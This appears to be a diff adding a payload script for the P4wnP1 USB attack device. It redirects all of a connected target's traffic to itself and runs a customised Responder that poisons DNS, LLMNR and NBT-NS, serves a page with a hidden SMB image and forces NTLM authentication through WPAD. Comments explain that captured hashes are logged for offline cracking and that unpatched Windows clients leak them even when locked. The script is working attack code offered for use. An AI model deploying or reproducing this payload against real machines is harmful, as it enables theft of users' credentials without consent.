@@ -1,0 +1,86 @@
+echo "Payload1 included"
+
+function onNetworkUp()
+{
+	echo "Network up"
+	echo "Active device $active_interface"
+	echo "P4wnP1 IP $IF_IP"
+	echo "P4wnP1 netmask $IF_MASK"
+
+
+     	# redirect all traffic meant to be routed out through the P4wnP1 to localhost (127.0.0.1)
+        #       this for example fetches traffic to DNS servers, which aren't overwritten by our DHCP lease
+        #       an UDP request to 8.8.4.4:53 from our target would end up here on 127.0.0.1:53, thanks to
+        #       the static routes for 0.0.0.0/1 and 128.0.0.0/1
+        iptables -t nat -A PREROUTING -i $active_interface -p tcp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+        iptables -t nat -A PREROUTING -i $active_interface -p udp -m addrtype ! --dst-type MULTICAST,BROADCAST,LOCAL -j REDIRECT
+
+	#start responder in screen
+        # Example setup
+        # -----------------
+        #
+        # The customized Responder (https://github.com/mame82/Responder, branch: EMULATE_INTERNET_AND_WPAD_ANYWAY) 
+        # runs the following setup:
+        #       1) DNS, LLMNR and NBT-NS enabled: As all packets arrive here, every possible hostname resolves to 172.16.0.1
+        #       no matter which name resolution technique is used by the target. This could be tested from the target by running:
+        #               $ ping <somerandomhostname>
+        #       2) Fingerprinting (OS discovery is enabled)
+        #       3) HTTP requests to any IP / hostname / domainname are redirected to Responder and served with a custom
+        #       HTML page (/home/pi/Responder/filles/AccessDenied.html). This file contains an invisible image referencing
+        #       a SMB share at \\spoofsmb\.
+        #       4) SMB requests (including the one to SPOOFSMB) are redirected to Responder and the client is forced to 
+        #       authenticate to a random challenge. NTLM hash of the user gets logged along with the provided challenge for offline
+        #       cracking in /home/pi/Responder/logs and /home/pi/Responder/Responder.db
+        #       5) Requests to wpad.dat are answered with a forced NTLM authentication (customized Responder needed to do this
+        #       while serving HTTP files). Such an request is issued everytime the host connects, because the WPAD server is
+        #       provided via DHCP. Windows Domain Clients without MS16-112 patch send the NTLM hash, even if the screen is locked.
+        #       This is basically the attack presented by Mubix.
+        #       6) Connectivity tests of Windows 7 and Windows 10 clients are answered correctly, thus the OS believes an Internet
+        #       connection is present on the interface (customized Responder needed to do this)
+        #       7) All other responder servers IMAP/POP3/FTP ... are running, too
+        #       8) Responder runs in a screen session, thus the output could be attached to a SSH session on the Pi:
+        #               $ ssh pi@172.16.0.1
+        #               $ sudo screen -d -r
+        screen -dmS responder bash -c "cd $wdir/Responder/; python Responder.py -I $active_interface -f -v -w -F"
+
+	touch /tmp/responder_started
+}
+
+function onTargetGotIP()
+{
+	echo "DHCP Lease given to target"
+	echo "Target IP $target_ip"
+
+        # add route back through target (for ICS)
+        route add -net default gw $target_ip
+
+	# add DNS entry for google DNS
+	echo nameserver 8.8.8.8 > /etc/resolv.conf
+
+	echo "On TargetGotIP finished"
+}
+
+function onBootFinished()
+{
+	# we should land here even if no RNDIS / CDC ECM is enabled
+	# as long as P4wnP1 gets connected to a target host
+
+
+	# print out "Hello World" via HID keyboard"
+	cd $wdir
+	python press.py
+}
+
+# commands in this function are ran on user login
+# the commans are ran by user "pi"
+function onLogin()
+{
+	echo "Waiting for responder to be started before attaching to screen session"
+	echo "Press <CTRL> + <C> to abort waiting"
+	while [ ! -f /tmp/responder_started ]; do
+		printf "."
+		sleep 0.5
+	done
+
+	sudo screen -d -r	
+}
